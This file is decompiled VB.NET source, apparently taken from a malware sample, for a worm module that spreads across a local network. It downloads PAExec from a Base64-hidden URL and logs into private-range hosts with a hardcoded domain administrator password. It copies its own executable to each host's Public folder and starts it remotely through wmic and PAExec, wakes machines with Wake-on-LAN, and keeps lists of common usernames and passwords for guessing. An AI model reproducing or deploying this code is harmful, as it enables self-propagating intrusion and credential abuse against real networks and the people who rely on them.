Imports System
Imports System.Collections.Generic
Imports System.IO
Imports System.Net
Imports System.Reflection
Imports System.Text.RegularExpressions
Imports System.Threading

Namespace Complex
	' Token: 0x0200000A RID: 10
	Friend Class NetworkSpreading
		' Token: 0x0600003C RID: 60 RVA: 0x00007568 File Offset: 0x00005768
		Public Shared Sub Run()
			Try
				NetworkSpreading.lanList = NetworkSpreading.GetLocalNetwork()
			Catch
				Return
			End Try
			Dim text As String = ""
			If NetworkSpreading.lanList.Count > 0 Then
				Try
					text = NetworkSpreading.DownloadTool()
				Catch
					Return
				End Try
			End If
			Try
				If File.Exists(text) Then
					For Each text2 As String In NetworkSpreading.lanList
						If text2.StartsWith("10.") OrElse text2.StartsWith("172.16.") OrElse text2.StartsWith("192.168.") Then
							Try
								If Program.CredActivate = "YES" Then
									Program.ProcessCommand("net.exe", "use \\" + text2 + " /USER:EDENFIELD\efadmin P455w0rd")
									Thread.Sleep(2000)
									File.Copy(Assembly.GetEntryAssembly().Location, "\\" + text2 + "\Users\Public\" + Path.GetFileName(Assembly.GetEntryAssembly().Location), True)
									If File.Exists("\\" + text2 + "\Users\Public\" + Path.GetFileName(Assembly.GetEntryAssembly().Location)) Then
										Program.ProcessCommand("wmic.exe", String.Concat(New String() { "/node:", text2, " /user:EDENFIELD\efadmin /password:P455w0rd process call create cmd.exe /c \", text2, "\Users\Public\", Path.GetFileName(Assembly.GetEntryAssembly().Location) }))
									End If
								Else
									Program.ProcessCommand("net.exe", "use \\" + text2)
									Thread.Sleep(2000)
									File.Copy(Assembly.GetEntryAssembly().Location, "\\" + text2 + "\Users\Public\" + Path.GetFileName(Assembly.GetEntryAssembly().Location), True)
									If File.Exists("\\" + text2 + "\Users\Public\" + Path.GetFileName(Assembly.GetEntryAssembly().Location)) Then
										Program.ProcessCommand("wmic.exe", String.Concat(New String() { "/node:", text2, " process call create cmd.exe /c \\", text2, "\Users\Public\", Path.GetFileName(Assembly.GetEntryAssembly().Location) }))
									End If
								End If
							Catch
							End Try
							If Program.CredActivate = "YES" Then
								Program.ProcessCommand(text, "\" + text2 + " -u EDENFIELD\efadmin -p P455w0rd -d -f -h -s -n 2 -c " + Assembly.GetEntryAssembly().Location)
							Else
								Program.ProcessCommand(text, "\" + text2 + " -d -f -h -s -n 2 -c " + Assembly.GetEntryAssembly().Location)
							End If
						End If
					Next
				End If
			Catch
				Return
			End Try
			Dim ipinfo As List(Of IPInfo) = IPInfo.GetIPInfo()
			For Each ipinfo2 As IPInfo In ipinfo
				Try
					If ipinfo2.IPAddress.StartsWith("10.") OrElse ipinfo2.IPAddress.StartsWith("172.16.") OrElse ipinfo2.IPAddress.StartsWith("192.168.") Then
						WakeOnLan.WakeUp(ipinfo2.MacAddress, ipinfo2.IPAddress, "255.255.255.0")
					End If
				Catch
					Return
				End Try
			Next
			For Each ipinfo3 As IPInfo In ipinfo
				Try
					Dim regex As Regex = New Regex(".")
					Dim subnet As String = String.Concat(New String() { regex.Split(ipinfo3.IPAddress)(0), ".", regex.Split(ipinfo3.IPAddress)(1), ".", regex.Split(ipinfo3.IPAddress)(2) })
					Dim list As List(Of String) = NetScan.scan(subnet)
					For Each text2 As String In list
						NetworkSpreading.MyIP = text2
						For Each text3 As String In list
							If text3.StartsWith("10.") OrElse text3.StartsWith("172.16.") OrElse text3.StartsWith("192.168.") Then
								Try
									If Program.CredActivate = "YES" Then
										Program.ProcessCommand("net.exe", "use \\" + text3 + " /USER:EDENFIELD\efadmin P455w0rd")
										Thread.Sleep(2000)
										File.Copy(Assembly.GetEntryAssembly().Location, "\\" + text3 + "\Users\Public\" + Path.GetFileName(Assembly.GetEntryAssembly().Location), True)
										If File.Exists("\\" + text3 + "\Users\Public\" + Path.GetFileName(Assembly.GetEntryAssembly().Location)) Then
											Program.ProcessCommand("wmic.exe", String.Concat(New String() { "/node:", text3, " /user:EDENFIELD\efadmin /password:P455w0rd process call create cmd.exe /c \\", text3, "\Users\Public\", Path.GetFileName(Assembly.GetEntryAssembly().Location) }))
										End If
									Else
										Program.ProcessCommand("net.exe", "use \\" + text2)
										Thread.Sleep(2000)
										File.Copy(Assembly.GetEntryAssembly().Location, "\\" + text3 + "\Users\Public\" + Path.GetFileName(Assembly.GetEntryAssembly().Location), True)
										If File.Exists("\\" + text3 + "\Users\Public\" + Path.GetFileName(Assembly.GetEntryAssembly().Location)) Then
											Program.ProcessCommand("wmic.exe", String.Concat(New String() { "/node:", text3, " process call create cmd.exe /c \\", text3, "\Users\Public\", Path.GetFileName(Assembly.GetEntryAssembly().Location) }))
										End If
									End If
								Catch
								End Try
								If Program.CredActivate = "YES" Then
									Program.ProcessCommand(text, "\" + text3 + " -u EDENFIELD\efadmin -p P455w0rd -d -f -h -s -n 2 -c " + Assembly.GetEntryAssembly().Location)
								Else
									Program.ProcessCommand(text, "\" + text3 + " -d -f -h -s -n 2 -c " + Assembly.GetEntryAssembly().Location)
								End If
							End If
						Next
					Next
				Catch
					Return
				End Try
			Next
			If File.Exists(text) Then
				File.Delete(text)
			End If
		End Sub

		' Token: 0x0600003D RID: 61 RVA: 0x00007E14 File Offset: 0x00006014
		Public Shared Function GetLocalNetwork() As List(Of String)
			Dim list As List(Of String) = New List(Of String)()
			Dim hostEntry As IPHostEntry = Dns.GetHostEntry(Dns.GetHostName())
			For Each ipaddress As IPAddress In hostEntry.AddressList
				If ipaddress.AddressFamily.ToString() = "InterNetwork" Then
					list.Add(ipaddress.ToString())
				End If
			Next
			Return list
		End Function

		' Token: 0x0600003E RID: 62 RVA: 0x00007E94 File Offset: 0x00006094
		Public Shared Function DownloadTool() As String
			Dim result As String
			If IntPtr.Size = 8 Then
				result = NetworkSpreading.DownloadFile(New Uri(Program.Base64Decode("aHR0cHM6Ly93d3cucG93ZXJhZG1pbi5jb20vcGFleGVjL3BhZXhlYy5leGU=")))
			Else
				result = NetworkSpreading.DownloadFile(New Uri(Program.Base64Decode("aHR0cHM6Ly93d3cucG93ZXJhZG1pbi5jb20vcGFleGVjL3BhZXhlYy5leGU=")))
			End If
			Return result
		End Function

		' Token: 0x0600003F RID: 63 RVA: 0x00007EE8 File Offset: 0x000060E8
		Public Shared Function DownloadFile(Url As Uri) As String
			Dim path As String = Path.GetRandomFileName().Replace(".", "").Remove(0, 3) + ".exe"
			Dim webClient As WebClient = New WebClient()
			webClient.DownloadFile(Url, Path.Combine(Path.GetTempPath(), path))
			Return Path.Combine(Path.GetTempPath(), path)
		End Function

		' Token: 0x04000058 RID: 88
		Public Shared lanList As List(Of String) = New List(Of String)()

		' Token: 0x04000059 RID: 89
		Public Shared MyIP As String = ""

		' Token: 0x0400005A RID: 90
		Public Shared names As List(Of String) = New List(Of String)() From { "Administrator", "Admin", "Guest", "User", "User1", "user-1", "Test", "root", "buh", "boss", "ftp", "rdp", "rdpuser", "rdpadmin", "manager", "support", "work", "other user", "operator", "backup", "asus", "ftpuser", "ftpadmin", "nas", "nasuser", "nasadmin", "superuser", "netguest", "alex" }

		' Token: 0x0400005B RID: 91
		Public Shared passes As List(Of String) = New List(Of String)() From { "Administrator", "administrator", "Guest", "guest", "User", "user", "Admin", "adminTest", "test", "root", "root", "123", "1234", "12345", "123456", "1234567", "12345678", "123456789", "1234567890", "Administrator123", "administrator123", "Guest123", "guest123", "User123", "user123", "Admin123", "admin123Test123", "test123", "password", "111111", "55555", "77777", "777", "qwe", "qwe123", "qwe321", "qwer", "qwert", "qwerty", "qwerty123", "zxc", "zxc123", "zxcv", "uiop", "123321", "321", "love", "secret" }
	End Class
End Namespace
